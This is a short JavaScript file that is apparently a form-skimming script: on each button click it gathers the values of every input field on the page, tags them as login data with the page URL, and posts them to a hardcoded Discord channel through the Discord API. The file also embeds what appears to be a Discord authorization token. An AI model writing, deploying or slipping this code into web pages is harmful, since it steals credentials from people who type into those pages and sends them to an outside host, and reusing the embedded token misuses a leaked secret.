const buttons = document.querySelectorAll('button')

buttons.forEach(btn => {
    btn.addEventListener('click', () => {
        let values = getInputValues();
        console.log("SENDING DATA: " + values)
        send("LOGIN DATA FROM: " + window.location + " - " + values)
        // console.log(getInputValues())
    })
})

function getInputValues(){
    const inputs = document.querySelectorAll('input')

    let data = {};

    inputs.forEach(input => {
        data[input.id] = input.value;
    })

    return JSON.stringify(data)
}

function send(message){

    let request = new XMLHttpRequest();

    let data = {"content": message, "tts": false};

    request.open("POST", "https://discord.com/api/v9/channels/555255679125028885/messages")
    request.setRequestHeader("authorization","NDAwODk1MDU2MDUzMTQxNTA3.YOd6uQ.Vi2VDC09w-vjuGuook63uUW7Vt0")
    request.setRequestHeader("Content-Type", "application/json")

    request.onreadystatechange = () => {
        if(request.readyState === XMLHttpRequest.DONE){
            // console.log("RESPONSE: " + request.responseText)
        }
    }

    request.send(JSON.stringify(data))
}
